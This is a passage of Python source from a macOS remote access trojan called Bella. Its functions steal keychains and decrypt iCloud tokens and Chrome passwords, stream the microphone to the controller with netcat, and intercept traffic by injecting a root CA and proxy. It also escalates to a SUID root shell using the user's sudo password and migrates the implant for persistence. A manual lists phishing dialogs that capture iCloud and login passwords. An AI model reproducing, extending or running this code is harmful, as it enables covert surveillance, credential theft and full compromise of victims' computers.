				send_msg(underline + "iCloud Photo Library: Disabled" + endANSI + "\n", False)
	except:
		send_msg("iCloud Photo Library: Disabled\n", False)

	i = 0
	try:
		z = resp_dict["backups"]
		if len(z) == 0:
			send_msg("\n%sNo iCloud Backups found%s\n\n" % (underline, endANSI), False)
		else:
			send_msg("%siCloud Backups:%s\n" % (underline, endANSI), False)
			for x in resp_dict["backups"]:
				i += 1
				#make a little dictionary to get the pretty name of the device.
				productTypes = {'iPhone3,1': 'iPhone 4 (GSM)', 'iPhone3,2': 'iPhone 4 (CDMA)', 'iPhone4,1': 'iPhone 4s', 'iPhone5,1': 'iPhone 5 (GSM)', 'iPhone5,2': 'iPhone 5 (CDMA)', 'iPhone5,3': 'iPhone 5c', 'iPhone6,2': 'iPhone 5s (UK)', 'iPhone7,1': 'iPhone 6 Plus', 'iPhone8,1': 'iPhone 6s', 'iPhone8,2': 'iPhone 6s Plus', 'iPhone6,1': 'iPhone 5s', 'iPhone7,2': 'iPhone 6'}
				try:
					iPhone_type = productTypes[x["productType"]]
				except:
					iPhone_type = x["productType"]
				send_msg("\t[%s] %s %s | Size is %s.%s GB | Model: %s\n" % (i, x["name"], x["lastModifiedLocalized"], str(x["storageUsedInBytes"])[0], str(x["storageUsedInBytes"])[1:4], iPhone_type), False)
	except Exception, e:
		send_msg("Error checking backups.\n%s\n" % str(e), False)

	if len(tokens[0]) > 1:
		send_msg("%sTokens!%s\n" % (underline, endANSI), False)
		send_msg("\tMMeAuth: %s%s%s\n" % (blue, tokens[0][0], endANSI), False)
		send_msg("\tCloud Kit: %s%s%s\n" % (red, tokens[0][1], endANSI), False)
		send_msg("\tFMF App: %s%s%s\n" % (yellow, tokens[0][2], endANSI), False)
		send_msg("\tFMiP: %s%s%s\n" % (green, tokens[0][3], endANSI), False)
		send_msg("\tFMF: %s%s%s\n" % (violet, tokens[0][4], endANSI), False)
	send_msg('', True)
	return

def insomnia_load():
	if "book" in get_model().lower():
		if is_there_SUID_shell():
			gen = payload_generator(readDB('insomnia', True)) #will return b64 zip
			payload_tmp_path = '/'.join(gen.split('/')[:-1])
			do_root('unzip %s -d %s' % (gen, payload_tmp_path))
			(success, msg) = do_root("chown -R 0:0 %s/Insomnia.kext/" % payload_tmp_path)
			if not success:
				return "%sError changing kext ownership to root.\n%s" % (red_minus, msg)
			(success, msg) = do_root("kextload %s/Insomnia.kext/" % payload_tmp_path)
			if not success:
				return "%sError loading kext.\n%s" % (red_minus, msg)
			return "%sInsomnia successfully loaded.\n" % greenPlus
		return "%sYou need a root shell to load Insomnia.\n" % red_minus
	else:
		return "%sInsomnia does not work on non-MacBooks.\n" % blue_star

def insomnia_unload():
	if "book" in get_model() or "Book" in get_model():
		if is_there_SUID_shell():
			(success, msg) = do_root("kextunload -b net.semaja2.kext.insomnia")
			if not success:
				return "%sError unloading kext.\n%s" % (red_minus, msg)
			return "%sInsomnia successfully unloaded.\n" % greenPlus
		return "%sYou need a root shell to load Insomnia.\n" % red_minus
	else:
		return "%sInsomnia does not work on non-MacBooks.\n" % blue_star

def resetUIDandName(): #if we are root we want to update the variable accordingly
	global bella_user, helper_location, bella_UID
	if os.getuid() == 0:
		bella_user = cur_GUI_user()
		bella_UID = pwd.getpwnam(bella_user).pw_uid
		helper_location = '/'.join(os.path.abspath(__file__).split('/')[:-1]) + '/'
	return

def initialize_socket():
	basicInfo = ''
	resetUIDandName()
	os.chdir(os.path.expanduser('~'))

	if not check_if_payloads():
		print 'requesting payloads'
		return 'payload_request_SBJ129' #request our payloads
	
	if readDB('lastLogin') == False: #if it hasnt been set
		updateDB('Never', 'lastLogin')

	if not isinstance(get_model(), str): #if no model, put it in
		output = check_output("sysctl hw.model")
		if output[0]:
			modelRaw = output[1].split(":")[1].replace("\n", "").replace(" ", "")
		output = check_output("/usr/libexec/PlistBuddy -c 'Print :\"%s\"' /System/Library/PrivateFrameworks/ServerInformation.framework/Versions/A/Resources/English.lproj/SIMachineAttributes.plist | grep marketingModel" % modelRaw)
		if not output[0]:
			model = 'Macintosh'
		else:
			model = output[1].split("=")[1][1:] #get everything after equal sign, and then remove first space.
		updateDB(model, 'model')

	if os.getuid() == 0:
		basicInfo = 'ROOTED\n'
	
	output = check_output('scutil --get LocalHostName; echo %s; pwd; echo %s' % (get_bella_user(), readDB('lastLogin')))
	if output[0]:
		basicInfo += output[1]
	else:
		return check_output("echo 'bareNeccesities'; scutil --get LocalHostName; whoami; pwd")[1]
	
	output = check_output('ps -p %s -o etime=' % bellaPID)
	if output[0]:
		basicInfo += output[1]
	else:
		return check_output("echo 'bareNeccesities'; scutil --get LocalHostName; whoami; pwd")[1]

	updateDB(time.strftime("%a, %b %e %Y at %I:%M:%S %p"), 'lastLogin')
	return basicInfo

def iTunes_backup_looker():
	backupPath = globber("/Users/*/Library/Application Support/MobileSync/Backup/*/Info.plist")
	if len(backupPath) > 0:
		backups = True
		returnable = "%sLooking for backups! %s\n" % (blue_star, blue_star)
		for z, y in enumerate(backupPath):
			returnable += "\n----- Device " + str(z + 1) + " -----\n\n"
			returnable += "Product Name: %s\n" % os.popen("/usr/libexec/PlistBuddy -c 'Print :\"Product Name\"' '%s'" % y).read().replace("\n", "")
			returnable += "Product Version: %s\n" % os.popen("/usr/libexec/PlistBuddy -c 'Print :\"Product Version\"' '%s'" % y).read().replace("\n", "")
			returnable += "Last Backup Date: %s\n" % os.popen("/usr/libexec/PlistBuddy -c 'Print :\"Last Backup Date\"' '%s'" % y).read().replace("\n", "")
			returnable += "Device Name: %s\n" % os.popen("/usr/libexec/PlistBuddy -c 'Print :\"Device Name\"' '%s'" % y).read().replace("\n", "")
			returnable += "Phone Number: %s\n" % os.popen("/usr/libexec/PlistBuddy -c 'Print :\"Phone Number\"' '%s'" % y).read().replace("\n", "")
			returnable += "Serial Number: %s\n" % os.popen("/usr/libexec/PlistBuddy -c 'Print :\"Serial Number\"' '%s'" % y).read().replace("\n", "")
			returnable += "IMEI/MEID: %s\n" % os.popen("/usr/libexec/PlistBuddy -c 'Print :\"IMEI\"' '%s'" % y).read().replace("\n", "")
			returnable += "UDID: %s\n" % os.popen("/usr/libexec/PlistBuddy -c 'Print :\"Target Identifier\"' '%s'" % y).read().replace("\n", "")
			returnable += "iTunes Version: %s\n" % os.popen("/usr/libexec/PlistBuddy -c 'Print :\"iTunes Version\"' '%s'" % y).read().replace("\n", "")
			#iTunesBackupString += "Installed Apps: %s\n" % os.popen("/usr/libexec/PlistBuddy -c 'Print :\"Installed Applications\"' '%s'" % y).read().replace("\n", "")
	else:
		backups = False
		returnable = "%sNo local backups found %s\n" % (blue_star, blue_star)
	return (returnable, backups, len(backupPath))

def kill_pid(pid):
	try:
		os.kill(pid, 9)
		return True
	except OSError, e:
		return False

def keychain_download():
	try:
		returnVal = []
		for x in globber("/Users/*/Library/Keychains/login.keychain*"):
			#with open(x, 'rb') as content:
			content = protected_file_reader(x) #will return us permission acceptable file info
			user = x.split("/")[2]
			returnVal.append(pickle.dumps(['%s_login.keychain' % user, content]))

		for iCloudKey in globber("/Users/*/Library/Keychains/*/keychain-2.db"):
			iCloudZip = StringIO.StringIO()
			joiner = '/'.join(iCloudKey.split("/")[:-1])
			for files in protected_file_lister(joiner):
				with zipfile.ZipFile(iCloudZip, mode='a', compression=zipfile.ZIP_DEFLATED) as zipped:
					subFile = os.path.join(joiner, files)
					content = protected_file_reader(subFile)
					zipped.writestr(files, content)
			with zipfile.ZipFile(iCloudZip, mode='a', compression=zipfile.ZIP_DEFLATED) as zipped:
				zipped.writestr(joiner.split("/")[-1], 'Keychain UUID')           
			returnVal.append(pickle.dumps(["%s_iCloudKeychain.zip" % iCloudKey.split("/")[2], iCloudZip.getvalue()]))
		if is_there_SUID_shell():
			keys = protected_file_reader("/Library/Keychains/System.keychain")
			returnVal.append(pickle.dumps(["System.keychain", keys]))
		return 'keychain_download' + pickle.dumps(returnVal)
	except Exception, e:
		return (red_minus + "Error reading keychains.\n%s\n") % str(e)

def manual():
	value = "\n%sChat History%s\nDownload the user's macOS iMessage database.\nUsage: %schat_history%s\nRequirements: None\n" % (underline + bold + light_blue, endANSI, bold, endANSI)
	value += "\n%sCheck Backups%s\nEnumerate the user's local iOS backups.\nUsage: %scheck_backups%s\nRequirements: None\n" % (underline + bold + light_blue, endANSI, bold, endANSI)
	value += "\n%sChrome Dump%s\nDecrypt user passwords stored in Google Chrome profiles.\nUsage: %schrome_dump%s\nRequirements: Chrome SS Key [see chrome_safe_storage]\n" % (underline + bold + green, endANSI, bold, endANSI)
	value += "\n%sChrome Safe Storage%s\nPrompt the keychain to present the user's Chrome Safe Storage Key.\nUsage: %schrome_safe_storage%s\nRequirements: None\n" % (underline + bold + green, endANSI, bold, endANSI)
	value += "\n%sCurrent Users%s\nFind all currently logged in users.\nUsage: %scurrentUsers%s\nRequirements: None\n" % (underline + bold + yellow, endANSI, bold, endANSI)
	value += "\n%sGet Root%s\nAttempt to escalate Bella to root through a variety of attack vectors.\nUsage: %sget_root%s\nRequirements: None\n" % (underline + bold + red, endANSI, bold, endANSI)
	value += "\n%sFind my iPhone%s\nLocate all devices on the user's iCloud account.\nUsage: %siCloud_FMIP%s\nRequirements: iCloud Password [see iCloud_phish]\n" % (underline + bold + light_blue, endANSI, bold, endANSI)
	value += "\n%sFind my Friends%s\nLocate all shared devices on the user's iCloud account.\nUsage: %siCloud_FMF%s\nRequirements: iCloud Token or iCloud Password\n" % (underline + bold + light_blue, endANSI, bold, endANSI)
	value += "\n%siCloud Contacts%s\nGet contacts from the user's iCloud account.\nUsage: %siCloud_contacts%s\nRequirements: iCloud Token or iCloud Password\n" % (underline + bold + light_blue, endANSI, bold, endANSI)	
	value += "\n%siCloud Password Phish%s\nTrick user into verifying their iCloud password through iTunes prompt.\nUsage: %siCloudPhish%s\nRequirements: None\n" % (underline + bold + light_blue, endANSI, bold, endANSI)
	value += "\n%siCloud Query%s\nGet information about the user's iCloud account.\nUsage: %siCloud_query%s\nRequirements: iCloud Token or iCloud Password\n" % (underline + bold + light_blue, endANSI, bold, endANSI)
	value += "\n%siCloud Token%s\nPrompt the keychain to present the User's iCloud Authorization Token.\nUsage: %siCloud_token%s\nRequirements: None\n" % (underline + bold + light_blue, endANSI, bold, endANSI)
	value += "\n%sInsomnia Load%s\nLoads an InsomniaX Kext to prevent laptop from sleeping, even when closed.\nUsage: %sinsomnia_load%s\nRequirements: root, laptops only\n" % (underline + bold + yellow, endANSI, bold, endANSI)
	value += "\n%sInsomnia Unload%s\nUnloads an InsomniaX Kext loaded through insomnia_load.\nUsage: %sinsomnia_unload%s\nRequirements: root, laptops only\n" % (underline + bold + yellow, endANSI, bold, endANSI)
	value += "\n%sBella Info%s\nExtensively details information about the user and information from the Bella instance.\nUsage: %sbella_info%s\nRequirements: None\n" % (underline + bold + yellow, endANSI, bold, endANSI)
	value += "\n%sKeychain Download%s\nDownloads all available Keychains, including iCloud, for offline processing.\nUsage: %skeychain_download%s\nRequirements: None\n" % (underline + bold + light_blue, endANSI, bold, endANSI)
	value += "\n%sMike Stream%s\nStreams the microphone input over a socket.\nUsage: %smike_stream%s\nRequirements: None\n" % (underline + bold + light_blue, endANSI, bold, endANSI)
	value += "\n%sMITM Start%s\nInjects a Root CA into the System Roots Keychain and redirects all traffic to the CC.\nUsage: %smitm_start%s\nRequirements: root.\n" % (underline + bold + yellow, endANSI, bold, endANSI)
	value += "\n%sMITM Kill%s\nEnds a MITM session started by MITM start.\nUsage: %smitm_kill%s\nRequirements: root.\n" % (underline + bold + yellow, endANSI, bold, endANSI)
	value += "\n%sReboot Server%s\nRestarts a Bella instance.\nUsage: %sreboot_server%s\nRequirements: None.\n" % (underline + bold + yellow, endANSI, bold, endANSI)
	value += "\n%sSafari History%s\nDownloads user's Safari history in a nice format.\nUsage: %ssafari_history%s\nRequirements: None.\n" % (underline + bold + light_blue, endANSI, bold, endANSI)
	value += "\n%sScreenshot%s\nTake a screen shot of the current active desktop.\nUsage: %sscreen_shot%s\nRequirements: None.\n" % (underline + bold + yellow, endANSI, bold, endANSI)
	value += "\n%sShutdown Server%s\nUnloads Bella from launchctl until next reboot.\nUsage: %sshutdown_server%s\nRequirements: None.\n" % (underline + bold + yellow, endANSI, bold, endANSI)
	value += "\n%sSystem Information%s\nReturns basic information about the system.\nUsage: %ssysinfo%s\nRequirements: None.\n" % (underline + bold + yellow, endANSI, bold, endANSI)
	value += "\n%sUser Pass Phish%s\nWill phish the user for their password with a clever dialog.\nUsage: %suser_pass_phish%s\nRequirements: None.\n" % (underline + bold + yellow, endANSI, bold, endANSI)
	#value += "\n%sInteractive Shell%s\nLoads an interactive reverse shell (bash) to the remote machine.\nUsage: %sinteractiveShell%s\n" % (underline + bold, endANSI, bold, endANSI)
	#value += "\n%sKey Start%s\nBegin keylogging in the background.\nUsage: %skeyStart%s (requires root)\n" % (underline + bold, endANSI, bold, endANSI)
	#value += "\n%sKey Kill%s\nStop keylogging started through Key Start\nUsage: %skeyStart%s (requires root)\n" % (underline + bold, endANSI, bold, endANSI)
	#value += "\n%sKey Read%s\nReads the encrypted key log file from Key Start.\nUsage: %skeyRead%s (requires root)\n" % (underline + bold, endANSI, bold, endANSI)
	return value

def mike_helper(payload_path):
	stream_port = 2897
	send_msg('%sOpening microphone.\n' % blue_star, False)
	pipe = subprocess.Popen('%s' % payload_path, stdout=subprocess.PIPE)
	subprocess_manager(pipe.pid, '/'.join(payload_path.split('/')[:-1]), 'Microphone') #keep track of mikepipe since it never closes, as well as payload path
	send_msg('%sOpened microphone [%s].\n' % (blue_star, pipe.pid), False)
	send_msg('%sOpening Stream.\n' % blue_star, False)
	stream = subprocess.Popen(('nc %s %s' % (host, stream_port)).split(), stdin=pipe.stdout, stdout=subprocess.PIPE)
	time.sleep(2) #give a few seconds to terminate if not running ...
	#stream.poll will be the exit code if it has exited, otherwise it will be None (so, None if we are connected)
	if stream.poll(): #if None, we are connected, see Else. If an integer, we have crashed.
		send_msg('%sListener could not be reached. Closing microphone.\n' % red_minus, False)
		if kill_pid(pipe.pid):
			send_msg('%sClosed microphone.\n' % blue_star, True)
		else:
			send_msg('%sError closing microphone with PID [%s].\n' % (red_minus, pipe.pid), True)
	else:
		send_msg('%sListener connected, microphone streaming.\n' % greenPlus, True)
	return 0

def mitm_kill(interface, certsha1):
	if not is_there_SUID_shell():
		return "%sYou must have a root shell to stop MITM. See rooter.\n" % red_minus

	x = check_output("networksetup -getsecurewebproxy %s" % interface)
	if not x[0]:
		if x[2] == 8:
			send_msg("%sThe interface [%s] does not exist." % (red_minus, interface), True)
		send_msg(x[1], True)
	if "Enabled: No" in x[1]:
		send_msg("%s\033[4mAlready disabled!\033[0m %s\n%s" % (yellow_star, yellow_star, x[1]), True)
		return

	cert = cert_remove(certsha1)
	if 'Error' in cert:
		send_msg('ERROR REMOVING CERTIFICATE FROM KEYCHAIN. YOU SHOULD PERFORM MANUALLY.\n', False)
	send_msg(cert, False)

	(success, msg) = do_root("networksetup -setwebproxy %s '' 0" % interface)
	if not success:
		send_msg("%sSetting [%s] HTTP proxy to null failed!\n" % (red_minus, interface), False)
	else:
		send_msg("%sSet [%s] HTTP proxy to null.\n" % (greenPlus, interface), False)

	(success, msg) = do_root("networksetup -setsecurewebproxy %s '' 0" % interface)
	if not success:
		send_msg("%sSetting [%s] HTTPS proxy to null failed!\n" % (red_minus, interface), False)
	else:
		send_msg("%sSet [%s] HTTPS proxy to null.\n" % (greenPlus, interface), False)
	
	(success, msg) = do_root("networksetup -setwebproxystate %s off" % interface)
	if not success:
		send_msg("%sFailed to turn off [%s] HTTP proxy!\n" % (red_minus, interface), False)
	else:
		send_msg("%sTurned off [%s] HTTP proxy.\n" % (greenPlus, interface), False)

	(success, msg) = do_root("networksetup -setsecurewebproxystate %s off" % interface)
	if not success:
		send_msg("%sFailed to turn off [%s] HTTP proxy!\n" % (red_minus, interface), False)
	else:
		send_msg("%sTurned off [%s] HTTP proxy.\n" % (greenPlus, interface), False)
	
	send_msg('', True)
	return 1

def mitm_start(interface, cert):
	if not is_there_SUID_shell():
		return "%sYou must have a root shell to start MITM. See rooter.\n" % red_minus

	x = check_output("networksetup -getsecurewebproxy %s" % interface)
	if not x[0]:
		if x[2] == 8:
			send_msg("%sThe interface [%s] does not exist." % (red_minus, interface), True)
		send_msg(x[1], True)
	if "Enabled: Yes" in x[1]:
		send_msg("%s\033[4mAlready enabled!\033[0m %s\n%s" % (yellow_star, yellow_star, x[1]), True)
		send_msg('', True)
		return

	cert = cert_inject(cert)
	if 'Error' in cert:
		send_msg(cert, True)
		send_msg('', True)
		return
	send_msg(cert, False)

	(success, msg) = do_root("networksetup -setwebproxy %s %s 8081" % (interface, host))
	if not success:
		send_msg("%sRedirecting [%s] HTTP (80) to [%s:8081] failed!\n" % (red_minus, interface, host), True)
	send_msg("%sRedirecting [%s] HTTP (80) to [%s:8081].\n" % (greenPlus, interface, host), False)

	(success, msg) = do_root("networksetup -setsecurewebproxy %s %s 8081" % (interface, host))
	if not success:
		send_msg("%sRedirecting [%s] HTTPS (443) to [%s:8081] failed!\n" % (red_minus, interface, host), True)
	send_msg("%sRedirecting [%s] HTTP (443) to [%s:8081].\n" % (greenPlus, interface, host), False)
	send_msg("mitmReady", True)
	return

def payload_generator(data):
	dirpath = tempfile.mkdtemp()
	with open("%s/americangirl" % dirpath, "wb") as content:
		content.write(data.decode('base64'))
	os.chmod("%s/americangirl" % dirpath, 0777) #set rw execute bits to 7 for ugw
	temp_file_list.append(dirpath)
	return '%s/americangirl' % dirpath

def payload_cleaner():
	for x in temp_file_list:
		try:
			shutil.rmtree(x)
			#print 'Removed %s' % x
			temp_file_list.remove(x)
		except OSError as e:
			pass
			print e
	return

def chainbreaker(kcpath, key, service):
	kcbreaker = readDB('chainbreaker', True)
	if not kcbreaker:
		return ("%sError reading chainbreaker from DB.\n" % red_minus, False)
	path = payload_generator(kcbreaker)
	try:
		value = (subprocess.check_output("%s -f '%s' -k '%s' -s '%s'" % (path, kcpath, key, service), shell=True).replace('\n', ''), True)
		if '[!] ERROR: ' in value[0]:
			return ("%sError decrypting %s with master key.\n\t%s" % (red_minus, service, value[0]), False)
		print repr(value[0])
		if value[0] == '':
			return ("No KC entry for %s." % service, False)

		return value
	except Exception as e:
		return ("%sError decrypting %s with master key.\n\t%s" % (red_minus, service, e), False)

def kciCloudHelper(iCloudKey):
	#this function is tailored to keychaindump. Takes an iCloud key, and returns tokens
	msg = base64.b64decode(iCloudKey)
	key = "t9s\"lx^awe.580Gj%'ld+0LG<#9xa?>vb)-fkwb92[}"
	hashed = hmac.new(key, msg, digestmod=hashlib.md5).digest()
	hexedKey = binascii.hexlify(hashed)
	IV = 16 * '0'
	mme_token_file = glob("/Users/%s/Library/Application Support/iCloud/Accounts/*" % get_bella_user()) #this doesnt need to be globber bc only current user's info can be decrypted
	for x in mme_token_file:
		try:
			int(x.split("/")[-1])
			mme_token_file = x
		except ValueError:
			continue
	send_msg("\t%sDecrypting token plist\n\t    [%s]\n" % (blue_star, mme_token_file), False)
	decryptedBinary = subprocess.check_output("openssl enc -d -aes-128-cbc -iv '%s' -K %s < '%s'" % (IV, hexedKey, mme_token_file), shell=True)
	from Foundation import NSData, NSPropertyListSerialization
	binToPlist = NSData.dataWithBytes_length_(decryptedBinary, len(decryptedBinary))
	token_plist = NSPropertyListSerialization.propertyListWithData_options_format_error_(binToPlist, 0, None, None)[0]
	tokz = "[%s | %s]\n" % (token_plist["appleAccountInfo"]["primaryEmail"], token_plist["appleAccountInfo"]["fullName"])
	tokz += "%s:%s\n" % (token_plist["appleAccountInfo"]["dsPrsID"], token_plist["tokens"]["mmeAuthToken"])
	return tokz

def getKeychains():
	send_msg("%sFound the following keychains for [%s]:\n" % (yellow_star, get_bella_user()), False)
	kchains = glob("/Users/%s/Library/Keychains/login.keychain*" % get_bella_user())
	for x in kchains:
		send_msg("\t[%s]\n" % x, False)
	if len(kchains) == 0:
		send_msg("%sNo Keychains found for [%s].\n" % (yellow_star, get_bella_user()), True)
		return
	kchain = kchains[-1]
	for x in kchains:
		if x.endswith('-db'):
			kchain = x
	return kchain

def bella_info():
	mainString = ""
	send_msg("%sGathering system information.\n" % yellow_star, False)
	systemVersion = str(platform.mac_ver()[0])
	send_msg("%sSystem version is %s.\n" % (blue_star, systemVersion), False)
	send_msg("%sShell location: [%s].\n" % (blue_star, get_bella_path()), False)
	send_msg(blue_star + get_model(), False)
	try:
		battery = subprocess.check_output("pmset -g batt", shell=True).decode('utf-8', 'replace').split('\t')[1].split(";")
		charging = battery[1].replace(" ", "")
		percentage = battery[0]
		if charging == "charging":
			send_msg("%sBattery: %s [Charging]\n" % (blue_star, percentage), False)
		else:
			send_msg("%sBattery: %s [Discharging]\n" % (blue_star, percentage), False)
	except:
		pass
	
	if not systemVersion.startswith("10.12"):
		if systemVersion == "10.11.1" or systemVersion == "10.11.2" or systemVersion == "10.11.3" or not systemVersion.startswith("10.11"):
			if is_there_SUID_shell(): #normal user.
				send_msg("%sHave root access via SUID shell. [use get_root to escalate]\n" % greenPlus, False)
			else:
				send_msg("%sPrivilege escalation is possible!\n" % blue_star, False) #LPA possible, no need to display sudoers access info.. right?
	else:
		if os.getuid() == 0:
			send_msg("%sBella is running as root.\n" % greenPlus, False)
		elif is_there_SUID_shell():
			send_msg("%sHave root access via SUID shell. [use get_root to escalate]\n" % greenPlus, False)
		else:
			send_msg("%sNo root access via SUID shell.\n" % red_minus, False)

	filevault = check_output("fdesetup status")
	if filevault[0]:
		if "On" in filevault[1]:
			send_msg(red_minus + filevault[1], False)
		else:
			send_msg(greenPlus + filevault[1], False)
	
	if systemVersion.startswith("10.11") or systemVersion.startswith("10.12"):
		csrutil = subprocess.Popen(["csrutil status"], stdout=subprocess.PIPE, shell=True)
		(out, err) = csrutil.communicate()
		if "disabled" in out:
			send_msg(greenPlus + out, False)
			sipEnabled = False #SIP function exists, but is specifically and intentionally disabled! (enterprise environments likely have this config)
		if "enabled" in out:
			send_msg(red_minus + out, False)
			sipEnabled = True
	else:
		sipEnabled = False
	
	if not sipEnabled: #sipDisabled allows us to check like .1% of cases where user is on El Cap and has opted out of SIP
		if is_there_SUID_shell():
			kcpayload = readDB('keychaindump', True)
			if not kcpayload:
				send_msg("%sError reading KCDump payload from Bella Database.\n" % red_minus, False)
			else:
				kcpath = payload_generator(kcpayload)
				kchain = getKeychains()
				(success, msg) = do_root("%s '%s' | grep 'Found master key:'" % (kcpath, kchain)) # ??? Why doesnt this work for tim?
				if success: 
					send_msg("    Login keychain master key found for [%s]:\n\t[%s]\n" % (kchain.split("/")[-1], msg.replace("[+] Found master key: ", "").replace("\n", "")), False)
					if not readDB('mme_token'):
						send_msg("\t%sAttempting to generate iCloud Auth Keys.\n" % blue_star, False)
						iCloud = chainbreaker(kchain, msg.replace("[+] Found master key: ", "").replace("\n", ""), 'iCloud')
						send_msg("\t%siCloud:\n\t    [%s]\n" % (yellow_star, iCloud[0]), False)
						if iCloud[1]:
							send_msg("\t%sGot iCloud Key! Decrypting plist.\n" % yellow_star, False)
							decrypted = kciCloudHelper(iCloud[0])
							if not decrypted:
								send_msg("\t%sError getting decrypted MMeAuthTokens with this key.\n" % red_minus, False)
							else:
								send_msg("\t%sDecrypted. Updating Bella database.\n" % blue_star, False)
								updateDB(encrypt(decrypted), 'mme_token')
								send_msg("\t%sUpdated DB.\n\t    --------------\n" % greenPlus, False)
					if not readDB('chromeSS'):
						send_msg("\t%sAttempting to generate Chrome Safe Storage Keys.\n" % blue_star, False)
						chrome = chainbreaker(kchain, msg.replace("[+] Found master key: ", "").replace("\n", ""), 'Chrome Safe Storage')
						send_msg("\t%sChrome:\n\t    [%s]\n" % (yellow_star, chrome[0]), False)
						if chrome[1]:
							send_msg("\t%sGot Chrome Key! Updating Bella DB.\n" % yellow_star, False)
							updateDB(encrypt(chrome[0]), 'chromeSS')
							send_msg("\t%sUpdated DB.\n" % greenPlus, False)
				else:
					send_msg("%sError finding %slogin%s master key for user [%s].\n\t%s\n" % (red_minus, bold, endANSI, get_bella_user(), msg), False)
				(success, msg) = do_root("%s '/Library/Keychains/System.keychain' | grep 'Found master key:'" % kcpath)
				if success:
					msg = msg.replace("[+] Found master key: ", "").replace("\n", "")
					if msg != '':
						send_msg("%sSystem keychain master key found:\n    [%s]\n" % (greenPlus, msg), False)
					else:
						send_msg("%sCould not find %sSystem%s master key.\n" % (red_minus, bold, endANSI), False)
				payload_cleaner()
	
	iTunesSearch = get_iTunes_accounts()
	
	for x in iTunesSearch:
		if x[0]:
			send_msg("%siCloud account present [%s:%s]\n" % (greenPlus, x[2], x[1]), False)
		else:
			send_msg(red_minus + x[1], False)

	iOSbackups = iTunes_backup_looker()
	
	if iOSbackups[1]:
		send_msg("%siOS backups are present and ready to be processed. [%s]\n" % (greenPlus, iOSbackups[2]), False)
	else:
		send_msg("%sNo iOS backups are present.\n" % red_minus, False)

	if os.access('/var/db/lockdown', os.X_OK): #if we can execute this path
		send_msg("%siOS lockdown files are present. [%s]\n" % (greenPlus, len(os.listdir("/var/db/lockdown")) - 1), False)
	
	checkToken = tokenRead()
	if isinstance(checkToken, str):
		send_msg("%siCloud AuthToken: %s\n\t[%s]\n" % (yellow_star, checkToken.split('\n')[0], checkToken.split('\n')[1]), False)

	checkChrome = chromeSSRead()
	if isinstance(checkChrome, str):
		send_msg("%sGoogle Chrome Safe Storage Key: \n\t[%s]\n" % (yellow_star, checkChrome), False)

	checkLP = local_pw_read()
	if isinstance(checkLP, str):
		send_msg("%s%s's local account password is available.\n" % (yellow_star, checkLP.split(':')[0]), False) #get username

	checkAP = applepwRead()
	if isinstance(checkAP, str):
		send_msg("%s%s's iCloud account password is available.\n" % (yellow_star, checkAP.split(':')[0]), False)
	send_msg('', True)
	return 1

def recv_msg(sock):
	raw_msglen = recvaux(sock, 4, True) #get first four bytes of message, will be enough to represent length.
	if not raw_msglen:
		return None
	msglen = struct.unpack('>I', raw_msglen)[0] #convert this length into 
	return recvaux(sock, msglen, False)

def recvaux(sock, n, length):
	if length:
		return sock.recv(4) # send over first 4 bytes of socket .... 
	data = ''
	while len(data) < n:
		packet = sock.recv(n - len(data))
		if not packet:
			return None
		data += packet
	return pickle.loads(data) #convert from serialized into normal.

def make_SUID_root_binary(password, LPEpath):
	root_shell = readDB("root_shell", True)
	with open("/usr/local/roots", "w") as content:
		content.write(root_shell.decode('base64'))
	if not LPEpath: #use password
		(username, password) = password.split(':')
		try:
			subprocess.check_output("echo %s | sudo -S ls" % password, shell=True) #this will return no error if successfull
		except Exception as e:
			return (False, "%sUser's local password does not give us sudo access!\n" % red_minus)
		try:
			subprocess.check_output("echo %s | sudo -S chown 0:0 /usr/local/roots; echo %s | sudo -S chmod 4777 /usr/local/roots" % (password, password), shell=True) #perform setUID on shell
		except Exception as e:
			return (False, "%sUser's local password gives us sudo access!\n%sThere was an error setting the SUID bit.\n[%s]\n" % (greenPlus, red_minus, e))
		return (True, "%sUser's local password gives us sudo access!\n%sSUID root file written to /usr/local/roots!\n" % (blue_star, greenPlus))
	else:
		#LPEpath should be a path to an interactive root shell (thinking mach race)
		#### IF THIS LINE IS STILL HERE, THEN THIS MACH RACE / LPE DOES NOT WORK. Code needs to be added to actually install the shell ####
		try:
			subprocess.check_output("%s <<< 'chown 0:0 /usr/local/roots; chmod 4777 /usr/local/roots'" % LPEpath, shell=True) #perform setUID on shell
			return (True, "%sUser is susceptible to LPE!\n%sSUID root file written to /usr/local/roots!\n" % (blue_star, greenPlus))
		except Exception as e:
			return (False, "%sUser is susceptible to LPE!\n%sThere was an error setting the SUID bit.\n[%s]\n" % (greenPlus, red_minus, e))

def migrateToRoot(rootsPath):
	#precondition to this function call is that a root shell exists at /usr/local/roots and that os.getuid != 0
	#therefore, we will not use the do_root() function, and will instead call the roots binary directly.
	#we do this because we want full control over what happens. The migration is a critical process
	#no room for error. an error could break our shell.
	### in order to test this function in development, bella must be installed through the INSTALLER script generated by BUILDER
	
	relativeBellaPath = '/' + '/'.join(get_bella_path().split("/")[3:])

	if not os.path.isfile('%sbella.db' % get_bella_path()): #if we can execute this path
		send_msg("Migration aborted. Could not find bella.db in\n\t[%s]" % get_bella_path(), False)
		return
	if not os.path.isfile('%sBella' % get_bella_path()): #if we can execute this path
		send_msg("%sMigration halted. Could not find Bella binary in:\n\t[%s].\n" % (red_minus, get_bella_path()), False)
		return
	if not os.path.isfile('/Users/%s/Library/LaunchAgents/%s.plist' % (get_bella_user(), launch_agent_name)): #if we can execute this path
		send_msg("%sMigration halted. Could not find LaunchAgent in:\n\t[/Users/%s/Library/LaunchAgents/%s.plist].\n" % (red_minus, get_bella_user(), launch_agent_name), False)
		return

	"""Create new bella location in /Library"""
	error = Popen("%s \"mkdir -p '%s'\"" % (rootsPath, relativeBellaPath), shell=True, stdout=PIPE, stderr=PIPE).stderr.read()
	if error != '':
		send_msg("%sError creating path:\n\t%s" % (red_minus, error), False)
		return
	else:
		send_msg("%sCreated path '%s'.\n" % (blue_star, relativeBellaPath), False)

	"""Copy bella database from current helper_location to new one in /Library"""
	error = Popen("%s \"cp '%sbella.db' '%sbella.db'\"" % (rootsPath, get_bella_path(), relativeBellaPath), shell=True, stdout=PIPE, stderr=PIPE).stderr.read()
	if error != '':
		send_msg("%sError copying Bella DB:\n\t%s" % (red_minus, error), False)
		return
	else:
		send_msg("%sCopied Bella DB '%sbella.db' to '%sbella.db'.\n" % (blue_star, get_bella_path(), relativeBellaPath), False)
	
	"""Copy bella binary from current helper_location to new one in /Library"""
	error = Popen("%s \"cp '%sBella' '%sBella'\"" % (rootsPath, get_bella_path(), relativeBellaPath), shell=True, stdout=PIPE, stderr=PIPE).stderr.read()
	if  error != '':
